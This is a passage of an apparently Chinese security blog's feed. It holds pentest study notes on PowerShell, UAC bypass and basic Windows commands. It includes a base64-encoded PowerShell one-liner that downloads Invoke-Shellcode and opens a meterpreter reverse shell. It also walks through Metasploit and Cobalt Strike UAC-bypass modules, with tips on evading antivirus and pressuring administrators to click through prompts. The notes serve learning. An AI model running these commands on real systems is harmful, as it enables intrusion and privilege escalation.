class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PowerShell.exe -NoP -NonI -Exec Bypass -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwAHMAOgAvAC8AcgBhAHcALgBnAGkAdABoAHUAYgB1AHMAZQByAGMAbwBuAHQAZQBuAHQALgBjAG8AbQAvAGMAaABlAGUAdAB6AC8AUABvAHcAZQByAFMAcABsAG8AaQB0AC8AbQBhAHMAdABlAHIALwBDAG8AZABlAEUAeABlAGMAdQB0AGkAbwBuAC8ASQBuAHYAbwBrAGUALQAtAFMAaABlAGwAbABjAG8AZABlAC4AcABzADEAJwApADsAIABJAG4AdgBvAGsAZQAtAFMAaABlAGwAbABjAG8AZABlACAALQBQAGEAeQBsAG8AYQBkACAAdwBpAG4AZABvAHcAcwAvAG0AZQB0AGUAcgBwAHIAZQB0AGUAcgAvAHIAZQB2AGUAcgBzAGUAXwBoAHQAdABwAHMAIAAtAEwAaABvAHMAdAAgADEAOQAyAC4AMQA2ADgALgAxADAALgAxADMANwAgAC0ATABwAG8AcgB0ACAANgA2ADYAIAAtAEYAbwByAGMAZQAKAA&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><h4 id=""><a href="#" class="headerlink" title=""></a></h4></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;Powershell&quot;&gt;&lt;a href=&quot;#Powershell&quot; class=&quot;headerlink&quot; title=&quot;Powershell&quot;&gt;&lt;/a&gt;Powershell&lt;/h3&gt;&lt;h4 id=&quot;Powershell基本概念&quot;&gt;&lt;a href=&quot;#Powersh</summary>
      
    
    
    
    <category term="内网安全" scheme="http://s1eady.top/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="内网" scheme="http://s1eady.top/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>内网学习--UAC</title>
    <link href="http://s1eady.top/2020/11/20/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0--UAC/"/>
    <id>http://s1eady.top/2020/11/20/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0--UAC/</id>
    <published>2020-11-20T05:09:14.000Z</published>
    <updated>2020-11-21T08:16:11.187Z</updated>
    
    <content type="html"><![CDATA[<h1 id="UAC"><a href="#UAC" class="headerlink" title="UAC"></a>UAC</h1><h4 id="uac"><a href="#uac" class="headerlink" title="uac"></a>uac</h4><p>用户帐户控制（User Account Control，简写作UAC)是微软公司在其Windows Vista及更高版本操作系统中采用的一种控制机制。通过 UAC，应用程序和任务可始终在非管理员帐户的安全上下文中运行，除非管理员特别授予管理员级别的系统访问权限。UAC 可以阻止未经授权的应用程序自动进行安装，并防止无意中更改系统设置。</p><p>即在权限不够的情况下，访问系统磁盘的根目录、window目录、Program File目录，以及读、写系统登录数据库的程序等操作，都需要经过UAC认证。</p><p>注意</p><p>在其Windows Vista及更高版本操作系统中才会有UAC,Windows Vista是微软公司所研发的具有重大创新意义的一个版本，其内核版本号为Windows NT 6.0。</p><p>具体的windows版本可以查看<code>https://blog.csdn.net/jincf2011/article/details/6696133</code>。</p><p>如果要获取管理员权限，可以通过以下几条：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1，进程已经拥有管理权限控制；</span><br><span class="line">2，进程被用户允许通过管理员权限运行。</span><br></pre></td></tr></table></figure><h4 id="uac等级"><a href="#uac等级" class="headerlink" title="uac等级"></a>uac等级</h4><ul><li><p>始终通知：最严格的设置，每当程序需要使用高级别的权限的时候都会提示本地用户。</p></li><li><p>仅在程序试图更改我的计算机时通知我：这是UAC的默设置。当本地的Windows程序要使用高级别的权限时，不会通知用户。但是，当第三方程序要使用高级别权限时，会提示本地用户。</p></li><li><p>仅在程序试图更改我的计算机时通知我(不降低桌面亮度)：与上一条设置的要求相同，但是在提示时用户不简单桌面的亮度。</p></li><li><p>从不提示：当用户为系统管理员时，所有程序都会以最高权限运行。</p></li></ul><h4 id="将会触发UAC授权的操作"><a href="#将会触发UAC授权的操作" class="headerlink" title="将会触发UAC授权的操作"></a>将会触发UAC授权的操作</h4><ol><li>配置Windows Update</li><li>增加或删除用户账户</li><li>改变用户的账户类型</li><li>改变UAC设置</li><li>安装ActiveX</li><li>安装或移除程序</li><li>安装设备驱动程序</li><li>设置家长控制</li><li>将文件移动或复制到Program Files或Windows目录</li><li>查看其他用户文件夹</li></ol><h4 id="查看当前用户的UAC等级"><a href="#查看当前用户的UAC等级" class="headerlink" title="查看当前用户的UAC等级"></a>查看当前用户的UAC等级</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">WHOAMI &#x2F;Groups | FIND &quot;S-1-16&quot;</span><br><span class="line">Mandatory Label\Medium Mandatory Level Label S-1-16-8192</span><br></pre></td></tr></table></figure><h4 id="UAC-Bypass"><a href="#UAC-Bypass" class="headerlink" title="UAC Bypass"></a>UAC Bypass</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1，白名单提权机制；如Wusa.exe Bypass UAC,infDefault.exe Bypass UAC,PkgMgr.exe Bypass UAC等。</span><br><span class="line">2，DLL 劫持；</span><br><span class="line">3，Windows 自身漏洞提权；</span><br><span class="line">4，远程注入；</span><br><span class="line">5，COM 接口技术。</span><br></pre></td></tr></table></figure><h4 id="Metasploit绕过UAC"><a href="#Metasploit绕过UAC" class="headerlink" title="Metasploit绕过UAC"></a>Metasploit绕过UAC</h4><h5 id="bypassuac模块"><a href="#bypassuac模块" class="headerlink" title="bypassuac模块"></a>bypassuac模块</h5><p>该模块将通过进程注入，利用受信任的发布者证书绕过Windows UAC。 它将为我们生成另一个关闭UAC的shell。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac</span><br><span class="line">msf5 exploit(windows&#x2F;local&#x2F;bypassuac) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit&#x2F;windows&#x2F;local&#x2F;bypassuac):</span><br><span class="line"></span><br><span class="line">   Name       Current Setting  Required  Description</span><br><span class="line">   ----       ---------------  --------  -----------</span><br><span class="line">   SESSION                     yes       The session to run this module on.</span><br><span class="line">   TECHNIQUE  EXE              yes       Technique to use if UAC is turned off (Accepted: PSH, EXE)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Windows x86</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(windows&#x2F;local&#x2F;bypassuac) &gt;</span><br></pre></td></tr></table></figure><p>注意：</p><ul><li>使用bypassuac模块进行提权时，系统当前用户必须在管理员组。</li><li>用户账户控制程序UAC设置为默认，即”仅在程序试图更改我的计算机时通知我”。</li></ul><h5 id="RunAs模块"><a href="#RunAs模块" class="headerlink" title="RunAs模块"></a>RunAs模块</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit&#x2F;windows&#x2F;local&#x2F;ask</span><br><span class="line">msf5 exploit(windows&#x2F;local&#x2F;ask) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit&#x2F;windows&#x2F;local&#x2F;ask):</span><br><span class="line"></span><br><span class="line">   Name       Current Setting  Required  Description</span><br><span class="line">   ----       ---------------  --------  -----------</span><br><span class="line">   FILENAME                    no        File name on disk</span><br><span class="line">   PATH                        no        Location on disk, %TEMP% used if not set</span><br><span class="line">   SESSION                     yes       The session to run this module on.</span><br><span class="line">   TECHNIQUE  EXE              yes       Technique to use (Accepted: PSH, EXE)</span><br></pre></td></tr></table></figure><p>注意：</p><ul><li><p>use exploit/windows/local/bypassuac_injection</p><p>set target  1         #设置目标系统类型，1是64位，0是32位</p></li><li><p>使用RunAs模块进行提权时，系统当前用户须在管理员组或者知道管理员的密码，用户账户控制程序UAC设置则没有要求。<br>使用RunAs模块进行提权时，会创建一个可执行文件，为了避免给杀毒软件查杀，该可执行文件（需进行免杀处理）的创建要使用EXE::Custom选项。</p><p>RunAs攻击的缺点是，程序企图修改计算机设置时，系统会对用户发出提醒。此警报可能会被管理人员认定为攻击。建议多次运行，系统多次对用户发出提醒后，对于缺乏安全意识或不厌其烦的管理人员会点击“是”，从而完成权限提升。</p></li></ul><h5 id="bypassuac-injection模块"><a href="#bypassuac-injection模块" class="headerlink" title="bypassuac_injection模块"></a>bypassuac_injection模块</h5><p>内存注入，bypassuac模块运行时会在目标机上创建多个文件，会被杀毒软件识别。exploit/windows/local/bypassuac_injection模块直接运行在内存中的反射DLL中，所以它不触碰硬盘，可以最大限度地降低被杀毒软件检测到的概率。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_injection</span><br><span class="line">msf5 exploit(windows&#x2F;local&#x2F;bypassuac_injection) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_injection):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   SESSION                   yes       The session to run this module on.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Windows x86</span><br></pre></td></tr></table></figure><ul><li>模块的使用需要选择正确的架构。</li></ul><h5 id="bypassuac-fodhelper模块"><a href="#bypassuac-fodhelper模块" class="headerlink" title="bypassuac_fodhelper模块"></a>bypassuac_fodhelper模块</h5><p>通过在当前用户配置单元下劫持注册表中的特殊键，并插入将在启动Windows fodhelper.exe应用程序时调用的自定义命令来绕过Windows 10 UAC。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_fodhelper</span><br><span class="line">msf exploit(windows&#x2F;local&#x2F;bypassuac_fodhelper) &gt; set session 1</span><br><span class="line">msf exploit(windows&#x2F;local&#x2F;bypassuac_fodhelper) &gt; exploit</span><br></pre></td></tr></table></figure><h5 id="bypassuac-eventvwr模块"><a href="#bypassuac-eventvwr模块" class="headerlink" title="bypassuac_eventvwr模块"></a>bypassuac_eventvwr模块</h5><p>该模块通过在当前用户配置单元下劫持注册表中的特殊键，并插入将在启动Windows fodhelper.exe应用程序时调用的自定义命令来绕过Windows 10 UAC。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_eventvwr</span><br><span class="line">msf exploit(windows&#x2F;local&#x2F;bypassuac_eventvwr) &gt; set session 1</span><br><span class="line">msf exploit(windows&#x2F;local&#x2F;bypassuac_eventvwr) &gt; exploit</span><br></pre></td></tr></table></figure><h5 id="bypassuac-comhijack模块"><a href="#bypassuac-comhijack模块" class="headerlink" title="bypassuac_comhijack模块"></a>bypassuac_comhijack模块</h5><p>模块将通过在HKCU配置单元中，创建COM处理程序注册表项来绕过Windows UAC。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_comhijack</span><br><span class="line">msf exploit(windows&#x2F;local&#x2F;bypassuac_comhijack) &gt; set session 1</span><br><span class="line">msf exploit(windows&#x2F;local&#x2F;bypassuac_comhijack) &gt; exploit</span><br></pre></td></tr></table></figure><h4 id="Cobalt-Strike绕过UAC"><a href="#Cobalt-Strike绕过UAC" class="headerlink" title="Cobalt Strike绕过UAC"></a>Cobalt Strike绕过UAC</h4><p>当前用户不是管理员，攻击会失效。要检查当前用户是否在管理员组里，使用 <code>run whoami /groups</code> 命令，查看当前用户组，如果权限不够，需要先提权，至 <code>Administrator</code> 或者 <code>SYSTEM</code> 权限。然后再通过 <code>elevate</code> 命令使用这些 Bypass UAC 的模块。</p><p>右击一个beacon-&gt;执行-&gt;提权-&gt;选择监听器-&gt;选择exp<code>uac-token-duplication</code>。</p><p>也可以</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">elevate uac-token-duplication beacon名字</span><br></pre></td></tr></table></figure><p>如果Bypass UAC 的 Beacon shell 是普通用户权限，我们需要在目标机器上点击弹出的对话框来确定是否更改UAC。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;UAC&quot;&gt;&lt;a href=&quot;#UAC&quot; class=&quot;headerlink&quot; title=&quot;UAC&quot;&gt;&lt;/a&gt;UAC&lt;/h1&gt;&lt;h4 id=&quot;uac&quot;&gt;&lt;a href=&quot;#uac&quot; class=&quot;headerlink&quot; title=&quot;uac&quot;&gt;&lt;/a&gt;uac&lt;/h</summary>
      
    
    
    
    <category term="内网安全" scheme="http://s1eady.top/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="内网" scheme="http://s1eady.top/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>渗透测试--windows系统信息收集与提权-(1)</title>
    <link href="http://s1eady.top/2020/11/20/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--windows%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B8%8E%E6%8F%90%E6%9D%83-(1)/"/>
    <id>http://s1eady.top/2020/11/20/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--windows%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B8%8E%E6%8F%90%E6%9D%83-(1)/</id>
    <published>2020-11-19T21:33:56.000Z</published>
    <updated>2020-11-21T08:25:13.722Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Windows-命令行基础"><a href="#Windows-命令行基础" class="headerlink" title="Windows 命令行基础"></a>Windows 命令行基础</h1><h2 id="列出当前文件清单"><a href="#列出当前文件清单" class="headerlink" title="列出当前文件清单"></a>列出当前文件清单</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\12521\Desktop&gt; dir</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    目录: C:\Users\12521\Desktop</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line">----                -------------         ------ ----</span><br><span class="line">d-----       2020&#x2F;10&#x2F;28     20:52                CTFTools</span><br><span class="line">d-----        2020&#x2F;11&#x2F;6     17:30                md</span><br><span class="line">d-----       2020&#x2F;11&#x2F;13     14:21                PHP开发资料</span><br><span class="line">d-----        2017&#x2F;7&#x2F;19      6:47                RSA-and-LLL-attacks-master</span><br><span class="line">d-----        2020&#x2F;11&#x2F;8     13:43                RSA-master</span><br><span class="line">d-----       2020&#x2F;11&#x2F;12     17:04                steady-learn</span><br><span class="line">d-----        2020&#x2F;11&#x2F;6     17:39                大三学习</span><br><span class="line">d-----        2020&#x2F;11&#x2F;8     15:04                常用文件</span><br><span class="line">-a----       2020&#x2F;10&#x2F;25     18:05            729 010 Editor.lnk</span><br><span class="line">-a----       2020&#x2F;11&#x2F;16     16:41              0 1.py</span><br><span class="line">-a----       2020&#x2F;10&#x2F;25     10:52         704029 WinHex.exe</span><br><span class="line">-a----        2020&#x2F;11&#x2F;3      0:09            740 XnView.lnk</span><br><span class="line">-a----       2020&#x2F;11&#x2F;16      8:28         179855 大三学习.zip</span><br><span class="line">-a----       2020&#x2F;11&#x2F;12     10:58           1262 天猫双11.lnk</span><br><span class="line">-a----        2020&#x2F;11&#x2F;7     19:21            607 有道云笔记.lnk</span><br></pre></td></tr></table></figure><h2 id="复制与合并文件"><a href="#复制与合并文件" class="headerlink" title="复制与合并文件"></a>复制与合并文件</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy 源文件 目的文件或者是目的目录</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\12521\Desktop&gt; copy 1.py 2.py</span><br></pre></td></tr></table></figure><p>复制1.py到2.py。</p><p>合并多个文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy 1.txt+2.txt+3.txt 123.txt</span><br></pre></td></tr></table></figure><h2 id="重命名文件"><a href="#重命名文件" class="headerlink" title="重命名文件"></a>重命名文件</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ren 源文件名 新文件名</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\12521\Desktop&gt; ren 1.py steady.py</span><br></pre></td></tr></table></figure><h2 id="输入输出重定向和管道"><a href="#输入输出重定向和管道" class="headerlink" title="输入输出重定向和管道"></a>输入输出重定向和管道</h2><h3 id="输出重定向"><a href="#输出重定向" class="headerlink" title="输出重定向"></a>输出重定向</h3><p>将命令输入输入到文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\12521\Desktop&gt; dir &gt; 1.txt</span><br></pre></td></tr></table></figure><h3 id="管道"><a href="#管道" class="headerlink" title="管道"></a>管道</h3><h2 id="显示文本内容"><a href="#显示文本内容" class="headerlink" title="显示文本内容"></a>显示文本内容</h2><p>显示文本内容，类似于linux下的cat</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\12521\Desktop&gt; type 2.py</span><br><span class="line">happy</span><br></pre></td></tr></table></figure><h2 id="将内容写入到指定文件中"><a href="#将内容写入到指定文件中" class="headerlink" title="将内容写入到指定文件中"></a>将内容写入到指定文件中</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\12521\Desktop&gt; echo &quot;good happy&quot; &gt; 2.txt</span><br><span class="line">PS C:\Users\12521\Desktop&gt; type 2.txt</span><br><span class="line">good happy</span><br></pre></td></tr></table></figure><h2 id="搜索指定文本内容"><a href="#搜索指定文本内容" class="headerlink" title="搜索指定文本内容"></a>搜索指定文本内容</h2><p>在一个文件或多个文件中搜索指定的文本字符串。当搜索指定的文件后，find 将显示出包含指定字符串的所有行。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">find &quot;文本内容&quot; 文件名</span><br><span class="line">C:\Users\12521\Desktop&gt;find &#x2F;?</span><br><span class="line">在文件中搜索字符串。</span><br><span class="line"></span><br><span class="line">FIND [&#x2F;V] [&#x2F;C] [&#x2F;N] [&#x2F;I] [&#x2F;OFF[LINE]] &quot;string&quot; [[drive:][path]filename[ ...]]</span><br><span class="line"></span><br><span class="line">  &#x2F;V         显示所有未包含指定字符串的行。</span><br><span class="line">  &#x2F;C         仅显示包含字符串的行数。</span><br><span class="line">  &#x2F;N         显示行号。</span><br><span class="line">  &#x2F;I         搜索字符串时忽略大小写。</span><br><span class="line">  &#x2F;OFF[LINE] 不要跳过具有脱机属性集的文件。</span><br><span class="line">  &quot;string&quot; 指定要搜索的文本字符串。</span><br><span class="line">  [drive:][path]filename</span><br><span class="line">             指定要搜索的文件。</span><br><span class="line"></span><br><span class="line">如果没有指定路径，FIND 将搜索在提示符处键入</span><br><span class="line">的文本或者由另一命令产生的文本。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\12521\Desktop&gt;find &quot;steady&quot; 2.py</span><br><span class="line"></span><br><span class="line">---------- 2.PY</span><br><span class="line">d-----       2020&#x2F;11&#x2F;12     17:04                steady-learn</span><br><span class="line">-a----       2020&#x2F;11&#x2F;16     16:41              0 steady.py</span><br></pre></td></tr></table></figure><h2 id="findstr命令"><a href="#findstr命令" class="headerlink" title="findstr命令"></a>findstr命令</h2><p>使用常规表达式搜索文件中的文本模式。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\12521\Desktop&gt;findstr &#x2F;?</span><br><span class="line">在文件中寻找字符串。</span><br><span class="line"></span><br><span class="line">FINDSTR [&#x2F;B] [&#x2F;E] [&#x2F;L] [&#x2F;R] [&#x2F;S] [&#x2F;I] [&#x2F;X] [&#x2F;V] [&#x2F;N] [&#x2F;M] [&#x2F;O] [&#x2F;P] [&#x2F;F:file]</span><br><span class="line">        [&#x2F;C:string] [&#x2F;G:file] [&#x2F;D:dir list] [&#x2F;A:color attributes] [&#x2F;OFF[LINE]]</span><br><span class="line">        strings [[drive:][path]filename[ ...]]</span><br><span class="line"></span><br><span class="line">  &#x2F;B         在一行的开始配对模式。</span><br><span class="line">  &#x2F;E         在一行的结尾配对模式。</span><br><span class="line">  &#x2F;L         按字使用搜索字符串。</span><br><span class="line">  &#x2F;R         将搜索字符串作为一般表达式使用。</span><br><span class="line">  &#x2F;S         在当前目录和所有子目录中搜索匹配文件。</span><br><span class="line">  &#x2F;I         指定搜索不分大小写。</span><br><span class="line">  &#x2F;X         打印完全匹配的行。</span><br><span class="line">  &#x2F;V         只打印不包含匹配的行。</span><br><span class="line">  &#x2F;N         在匹配的每行前打印行数。</span><br><span class="line">  &#x2F;M         如果文件含有匹配项，只打印其文件名。</span><br><span class="line">  &#x2F;O         在每个匹配行前打印字符偏移量。</span><br><span class="line">  &#x2F;P         忽略有不可打印字符的文件。</span><br><span class="line">  &#x2F;OFF[LINE] 不跳过带有脱机属性集的文件。</span><br><span class="line">  &#x2F;A:attr    指定有十六进位数字的颜色属性。请见 &quot;color &#x2F;?&quot;</span><br><span class="line">  &#x2F;F:file    从指定文件读文件列表 (&#x2F; 代表控制台)。</span><br><span class="line">  &#x2F;C:string  使用指定字符串作为文字搜索字符串。</span><br><span class="line">  &#x2F;G:file    从指定的文件获得搜索字符串。 (&#x2F; 代表控制台)。</span><br><span class="line">  &#x2F;D:dir     查找以分号为分隔符的目录列表</span><br><span class="line">  strings    要查找的文字。</span><br><span class="line">  [drive:][path]filename</span><br><span class="line">             指定要查找的文件。</span><br><span class="line"></span><br><span class="line">除非参数有 &#x2F;C 前缀，请使用空格隔开搜索字符串。</span><br><span class="line">例如: &#39;FINDSTR &quot;hello there&quot; x.y&#39; 在文件 x.y 中寻找 &quot;hello&quot; 或</span><br><span class="line">&quot;there&quot;。&#39;FINDSTR &#x2F;C:&quot;hello there&quot; x.y&#39; 文件 x.y  寻找</span><br><span class="line">&quot;hello there&quot;。</span><br><span class="line"></span><br><span class="line">一般表达式的快速参考:</span><br><span class="line">  .        通配符: 任何字符</span><br><span class="line">  *        重复: 以前字符或类出现零或零以上次数</span><br><span class="line">  ^        行位置: 行的开始</span><br><span class="line">  $        行位置: 行的终点</span><br><span class="line">  [class]  字符类: 任何在字符集中的字符</span><br><span class="line">  [^class] 补字符类: 任何不在字符集中的字符</span><br><span class="line">  [x-y]    范围: 在指定范围内的任何字符</span><br><span class="line">  \x       Escape: 元字符 x 的文字用法</span><br><span class="line">  \&lt;xyz    字位置: 字的开始</span><br><span class="line">  xyz\&gt;    字位置: 字的结束</span><br><span class="line"></span><br></pre></td></tr></table></figure><p> findstr 接受的元字符。</p><table><thead><tr><th>字符</th><th>值</th></tr></thead><tbody><tr><td>.</td><td>通配符：任何字符</td></tr><tr><td>*</td><td>重复：以前字符或类的零次或多次出现</td></tr><tr><td>^</td><td>行位置：行的开始</td></tr><tr><td>$</td><td>行位置：行的结尾</td></tr><tr><td>[class]</td><td>字符类：集合中任何一个字符</td></tr><tr><td>[^class]</td><td>反类：不在集合中的任何一个字符</td></tr><tr><td>[x-y</td><td>范围：范围：指定范围内的任何字符</td></tr><tr><td>\x</td><td>取消：元字符 x 的文字用途</td></tr><tr><td>&lt;xyz</td><td>字位置：字首</td></tr><tr><td>xyz&gt;</td><td>字位置：字尾</td></tr></tbody></table><h2 id="递归查找文件"><a href="#递归查找文件" class="headerlink" title="递归查找文件"></a>递归查找文件</h2><p>递归查找当前目录以及子目录中的后缀为md的文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\12521\Desktop&gt;for &#x2F;r steady-learn %i in (*.md) do @echo %i</span><br><span class="line">C:\Users\12521\Desktop\steady-learn\Buuctf.md</span><br><span class="line">C:\Users\12521\Desktop\steady-learn\CTF--python库zipfile的使用.md</span><br><span class="line">C:\Users\12521\Desktop\steady-learn\CTF-python库的使用.md</span><br><span class="line">C:\Users\12521\Desktop\steady-learn\CTF-密码刷题.md</span><br><span class="line">C:\Users\12521\Desktop\steady-learn\CTF-杂项.md</span><br><span class="line">C:\Users\12521\Desktop\steady-learn\CTF-杂项刷题.md</span><br><span class="line">C:\Users\12521\Desktop\steady-learn\CTF-杂项刷题1.md</span><br><span class="line">C:\Users\12521\Desktop\steady-learn\CTF杂项手册.md</span><br><span class="line">C:\Users\12521\Desktop\steady-learn\Linux命令.md</span><br><span class="line">C:\Users\12521\Desktop\steady-learn\Python学习.md</span><br><span class="line">C:\Users\12521\Desktop\steady-learn\Wireshark.md</span><br><span class="line">C:\Users\12521\Desktop\steady-learn\内存取证.md</span><br><span class="line">C:\Users\12521\Desktop\steady-learn\进制介绍.md</span><br><span 